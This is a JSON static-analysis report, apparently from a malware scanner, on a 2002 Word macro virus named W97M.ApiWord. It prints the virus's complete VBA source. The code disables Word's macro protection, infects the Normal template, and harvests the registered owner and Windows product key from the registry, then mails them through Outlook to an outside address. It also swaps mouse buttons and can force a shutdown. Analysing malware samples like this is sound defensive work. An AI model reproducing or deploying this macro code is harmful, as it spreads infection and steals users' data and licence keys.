{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"ApiWord\""
        ],
        "behavior": {
            "AccessVBOM": "May attempt to disable VBA macro security and Protected View",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "Environ": "May read system environment variables",
            "Lib": "May run code from a DLL",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows"
        },
        "macro": "\n\nPrivate Declare Function Sleep& Lib \"kernel32\" (ByVal dwReserved As Long)\nPrivate Declare Function CopyFile& Lib \"kernel32\" Alias \"CopyFileA\" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Boolean)\nPrivate Declare Function CreateDirectory& Lib \"kernel32\" Alias \"CreateDirectoryA\" (ByVal lpszCrDir As String, ByVal secu As Long)\nPrivate Declare Function ExitWindowsEx& Lib \"user32\" (ByVal uFlags As Long, ByVal dwReserved As Long)\nPrivate Declare Function ShowCursor& Lib \"user32\" (ByVal fshow As Boolean)\nPrivate Declare Function SwapMouseButton& Lib \"user32\" (ByVal bSwap As Long)\nPrivate Declare Function WritePrivateProfileString& Lib \"kernel32\" Alias \"WritePrivateProfileStringA\"                 (ByVal lpszSection As String, ByVal lpszKey As String,                 ByVal lpszString As String, ByVal lpszFile As String)\n                \nSub AutoOpen()\nslp = Sleep(1000)\nwinp = Environ(\"windir\")\ncrd = CreateDirectory(winp + \"\\ApiSystem\", 0)\ncp = CopyFile(ActiveDocument.FullName, winp + \"\\ApiSystem\\HelloU.doc\", False)\n\nCall endprotect\nCall infdoc\nCall SrchF\nCall PayLoad\n\nEnd Sub\n\nSub HelpAbout()\nMsgBox \"System must be shutdown.\", vbCritical, \"Warning\"\next = ExitWindowsEx(2, 0)\nEnd Sub\n\nSub SrchF()\nOn Error Resume Next\nwinp = Environ(\"windir\")\ninfile = winp + \"\\ApiSystem\\AboutU.ini\"\n\nMS = \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\ApiWord\"\nIf System.PrivateProfileString(\"\", MS, \"Send Info\") <> \"OK\" Then\n\nCV = \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\"\nnom = System.PrivateProfileString(\"\", CV, \"RegisteredOwner\")\nent = System.PrivateProfileString(\"\", CV, \"RegisteredOrganization\")\nver = System.PrivateProfileString(\"\", CV, \"Version\")\nvern = System.PrivateProfileString(\"\", CV, \"VersionNumber\")\npi = System.PrivateProfileString(\"\", CV, \"ProductId\")\npk = System.PrivateProfileString(\"\", CV, \"ProductKey\")\npf = System.PrivateProfileString(\"\", CV, \"ProgramFilesDir\")\n\nsp = System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\", \"Start Page\")\n\nwr = WritePrivateProfileString(\"Information\", \"Name\", nom, infile)\nwr = WritePrivateProfileString(\"Information\", \"Organization\", ent, infile)\nwr = WritePrivateProfileString(\"Information\", \"Version of Windows\", ver, infile)\nwr = WritePrivateProfileString(\"Information\", \"Number of Version\", vern, infile)\nwr = WritePrivateProfileString(\"Information\", \"Identification Number\", pi, infile)\nwr = WritePrivateProfileString(\"Information\", \"Key Number\", pk, infile)\nwr = WritePrivateProfileString(\"Information\", \"Program Files Path\", pf, infile)\nwr = WritePrivateProfileString(\"Information\", \"Start Page\", sp, infile)\n\nSet out = CreateObject(\"Outlook.Application\")\nSet map = out.GetNameSpace(\"MAPI\")\nmap.Logon \"profile\", \"password\"\nmel = out.CreateItem(0)\nmel.To = \"apiinfo@lycos.fr\"\nmel.Subject = \"Mail from \" + nom\nmel.Attachments.Add (infile)\nmel.DeleteafterSubmit = True\nmel.Send\nmap.Logoff\n\nSystem.PrivateProfileString(\"\", MS, \"Author\") = \"PetiK\"\nSystem.PrivateProfileString(\"\", MS, \"Info File\") = infile\nSystem.PrivateProfileString(\"\", MS, \"Name\") = \"W97M.ApiWord\"\nSystem.PrivateProfileString(\"\", MS, \"Version\") = \"A\"\nSystem.PrivateProfileString(\"\", MS, \"Send Info\") = \"OK\"\nEnd If\n\nEnd Sub\n\nSub infdoc()\nOn Error Resume Next\nwinp = Environ(\"windir\")\nSet Nor = NormalTemplate.VBProject.VBComponents\nSet Doc = ActiveDocument.VBProject.VBComponents\nDropFile = winp + \"\\ApiSystem\\src.txt\"\nIf Nor.Item(\"ApiWord\").Name <> \"ApiWord\" Then\n    Doc(\"ApiWord\").Export DropFile\n    Nor.Import DropFile\nEnd If\nIf Doc.Item(\"ApiWord\").Name <> \"ApiWord\" Then\n    Nor(\"ApiWord\").Export DropFile\n    Doc.Import DropFile\n    ActiveDocument.Save\nEnd If\nEnd Sub\n\nSub endprotect()\nWith Options\n    .ConfirmConversions = False\n    .VirusProtection = False\n    .SaveNormalPrompt = False\nEnd With\nSelect Case Application.Version\nCase \"10.0\"\n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security\", \"Level\") = 1&\n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security\", \"AccessVBOM\") = 1&\nCase \"9.0\"\n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\nEnd Select\nWordBasic.DisableAutoMacros 0\nEnd Sub\n\nSub PayLoad()\nnum = Int((Rnd * 10) + 1)\nIf num = 1 Then\nsm = SwapMouseButton(&H2)\nElseIf num = 5 Then\nsc = ShowCursor(False)\nslp = Sleep(10000)\nsc = ShowCursor(True)\nEnd If\n\n\nEnd Sub\n\n\n"
    },
    "filename": "VirusShare_0b6d3ba97c607d4c334e45fda1907912",
    "filesize": 37888,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.1, Code page: 1252, Author:  , Template: Normal, Last Saved By:  , Revision Number: 5, Name of Creating Application: Microsoft Word 9.0, Total Editing Time: 01:00, Create Time/Date: Mon May 13 17:14:00 2002, Last Saved Time/Date: Tue May 14 20:12:00 2002, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "0b6d3ba97c607d4c334e45fda1907912",
        "sha1": "826552b0aa5837a1c4c205d8c980d103deaafc01",
        "sha256": "c3b412b22bfebc7b5b3193ce249e51c1cc42f78e486cb88e604a7ff59da805df"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj==",
            ". A!",
            "le&LueF",
            "Normal",
            "Microsoft Word 9.0",
            "Titre",
            "0\u01ffE{",
            "0\u01ffE{",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$Custom",
            "izC1",
            "Project",
            "windir$",
            "m =  ",
            " win",
            " FalA",
            "em muso",
            "windir$",
            "\\ApiSystem\\AboutU.ini",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\ApiWord",
            "Send Info",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion'",
            "RegisteredOwner",
            "RegisteredOrganization ",
            "Version",
            "VersionNumber",
            "ProductId",
            "ProductKey ",
            "ProgramFilesDir",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main",
            "Start Page ",
            "Information",
            "Name ",
            "Information",
            "Organization ",
            "Information",
            "Version of Windows ",
            "Information",
            "Number of Version",
            "Information",
            "Identification Number",
            "Information",
            "Key Number ",
            "Information",
            "Program Files Path ",
            "Information",
            "Start Page ",
            "Outlook.Application",
            "MAPI ",
            "profile",
            "password ",
            "apiinfo@lycos.fr ",
            "Mail from  ",
            "PetiK",
            "Author ",
            "Info File",
            "W97M.ApiWord",
            "Name ",
            "Version",
            "Send Info",
            "windir$",
            "\\ApiSystem\\src.txt",
            "ApiWord",
            "ApiWord",
            "ApiWord",
            "ApiWord",
            "ApiWord",
            "ApiWord",
            "10.0K",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security",
            "Level",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security",
            "AccessVBOM ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "\\ApiSystem\\HelloU.doc",
            "System must be shutdown. ",
            "Warning",
            "\\ApiSystem",
            "Attribut",
            "e VB_Nam",
            "e = \"Api",
            "Word\"",
            "riva",
            "pDec",
            "lare Fun",
            "ction Sl",
            "eep& Lib",
            " \"kernel",
            "32\" (ByV",
            "al dwRes",
            "erved As@ Long)",
            "CopyFile",
            "MAlias \"",
            "_lpExispting",
            "ng, ",
            "bFai(lIf",
            "GsRBo olean",
            "Directo",
            "\t[sz",
            "Sleep",
            "CopyFileA",
            "CreateDirectoryA",
            "ExitWindowsEx",
            "ShowCursor",
            "SwapMouseButton",
            "WritePrivateProfileStringA",
            "Sectionq",
            "fdoc@",
            "7Vsecu",
            "WtWindowsEx",
            "uFlag",
            "+ShowCursor",
            "+`MSwapMo",
            ")Button",
            "bA\t!@WriteDProfCR",
            "DlpszSyszKey+EqP",
            " AutoOpen(@",
            " (1000",
            "Enviro",
            "dir\"Q@",
            "+ \"\\@System\", ",
            "n(A`}ve",
            "Document .Fullm, ",
            "\\HelloU",
            ".doc@\tFal",
            "l endprot)",
            " SrchFd",
            "yLoad",
            "End @",
            "pAboutA ",
            "MsgBox \"",
            " must b@e shut@cn\".@",
            "vbC@Eic",
            "al, \"Warn",
            "ext!h<(2c",
            "On Error I",
            "! N`",
            "B =~ P.",
            ".ini`",
            "\"HKEY_",
            "LOCAL_MA",
            "CHINE\\So",
            "\\Mic8ros",
            "A5IfJ ",
            "S. Inf",
            "o\") <> \"",
            "OK\" ThenA*CV?",
            "\\ r@Versb",
            "Reg eredpOwneBS@\t",
            "rganiza[ver",
            "Numrb",
            "d uctId!",
            "ghramAs\u0301",
            "s!z]4KS(CU",
            "RRENT_US",
            "ERO(t\\Int",
            "~t Explo",
            "rer\\Main",
            "'\"Start Pages",
            "WeStr8(\"q)|rms",
            "!qE`",
            "O!,PGt",
            "\" of /P",
            "(, q(",
            "Id 4",
            "if0N\"",
            "*, p~i?",
            "/g( (p!thP",
            "&, sp",
            " ret a2n",
            "Objf(\"Ou",
            "tlook.Ap,pld",
            "maC1@",
            ".Get'S",
            "pace(\"MA",
            ".Log",
            "\"kqA",
            "passwmel",
            "Item(1t",
            "\"api",
            ",o@lycos.fr S",
            "!3l frpT\" d+ /",
            "chAws.Add",
            " (&1",
            "Dele0teaf8",
            "mTrue",
            "t2~b\u03d28p",
            "b0hoYq\tPetiK",
            "wf<r",
            "pf=;0",
            ".l?5",
            "W97Mp",
            "iqOq",
            "o.eoA&NP= ",
            "malTempl.VB1",
            "@Compon`<s",
            "D8rop5",
            "\\src.txtP",
            "Sav0",
            "With Op!T",
            ".Confirm`",
            ".VirusP",
            "!!= ",
            "J Case ",
            "I.$-\u1c10",
            "\"10.0",
            "|t\\Ofbe\\q",
            "\\Securit",
            "y\", \"Lev",
            "el\") = 1",
            "tem.Priv",
            "ateProfi",
            "leString",
            "HKEY_",
            "CURRENT_",
            "USER\\Sof",
            "tware\\Mi",
            "cros",
            "fice\\10.@0\\Word",
            "ccessVBO",
            "yCase \"9.0\"P",
            "End Sele",
            "WBas",
            "ic.Disab",
            "leAutoMa!",
            "Sub ",
            "PayLoad(@)",
            "I nt((R'* 10) + 1",
            "1 Th en",
            "apMouseB",
            "utton(&HB2",
            "Else",
            "-ShowC",
            "ursor(Fa#",
            "leep(10",
            "0True",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\System3",
            "e2.tlb",
            "#OLE Automation",
            "ENormal",
            "ENCr",
            "!Offic",
            "!G{2",
            "DF8D04C-",
            "5BFA-101@B-BDE5gAjAe4",
            "ram File",
            "s\\MicrosPoft ",
            "SO9.DLL#",
            " 9.0 Ob",
            " Librar",
            "aThi",
            "sDocumenPtG",
            "uQEe",
            "ApiWor",
            "WBhd",
            "ThisDocument",
            "ApiWord",
            "ID=\"{3B0D761F-EC77-468C-85FF-A202B262B215}\"",
            "Document=ThisDocument/&H00000000",
            "Module=ApiWord",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"585A803684368436843684\"",
            "DPB=\"B0B2688B698B698B\"",
            "GC=\"080AD0E3D1E3D11C\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ApiWord=22,P",
            " 29, 697, 477, Z",
            "_Evaluate",
            "Normal",
            "Document Microsoft Word",
            "MSWordDoc",
            "Word.Document.8",
            "lpExistingFileName",
            "lpNewFileName",
            "bFailIfExists",
            "CreateDirectoryf",
            "lpszCrDir",
            "secuG",
            "ExitWindowsExN",
            "uFlags&u",
            "user32*",
            "ShowCursor",
            "fshowq",
            "SwapMouseButton}",
            "bSwap",
            "WritePrivateProfileStringx",
            "lpszSectionq",
            "lpszKeyS",
            "lpszString",
            "lpszFile[",
            "AutoOpen*",
            "PayLoadg",
            "HelpAbout>",
            "SrchF",
            "winp",
            "Environ",
            "infile}",
            "MSI^",
            "Systema",
            "PrivateProfileString[",
            "ent\u0749",
            "verw",
            "vernE6",
            "sp$_",
            "outZ",
            "CreateObject",
            "UU\u02313OVOq?'Z",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Projet1",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Module1b",
            "ApiWord",
            "Sleep",
            "dwReserved",
            "kernel32_",
            "CopyFile",
            "lpExistingFileName",
            "lpNewFileName",
            "bFailIfExists",
            "CreateDirectoryf",
            "lpszCrDir",
            "secuG",
            "ExitWindowsExN",
            "uFlags&u",
            "user32*",
            "ShowCursor",
            "fshowq",
            "SwapMouseButton}",
            "bSwap",
            "WritePrivateProfileStringx",
            "lpszSectionq",
            "lpszKeyS",
            "lpszString",
            "lpszFile[",
            "AutoOpen*",
            "PayLoadg",
            "HelpAbout>",
            "SrchF",
            "winp",
            "Environ",
            "infile}",
            "MSI^",
            "Systema",
            "PrivateProfileString[",
            "ent\u0749",
            "verw",
            "vernE6",
            "sp$_",
            "outZ",
            "CreateObject",
            "GetNameSpaceC",
            "LogonL",
            "melP",
            "CreateItem~",
            "SubjectRP",
            "Attachments_",
            "Addr",
            "DeleteafterSubmit",
            "Send",
            "LogoffQ8",
            "infdoc:c",
            "Nor!",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "ActiveDocument\\",
            "DropFilen",
            "Itemz",
            "Export",
            "Importi",
            "Save",
            "endprotect\\Q",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "Application*",
            "Version",
            "WordBasic",
            "DisableAutoMacros",
            "RndR",
            "Documentj",
            "_B_var_Environ/",
            "_B_var_winp",
            "_B_var_Nor2w",
            "_B_var_DocA",
            "_B_var_DropFileeF",
            "_B_var_num",
            "_B_var_crd<",
            "MsgBoxR",
            "vbCritical+}",
            "extO",
            "slpm",
            "FullName\u041e",
            "sm!_",
            "lseIfW"
        ],
        "file": {
            "\\ApiSystem\\HelloU.doc": "Word",
            "\\ApiSystem\\src.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.343663",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
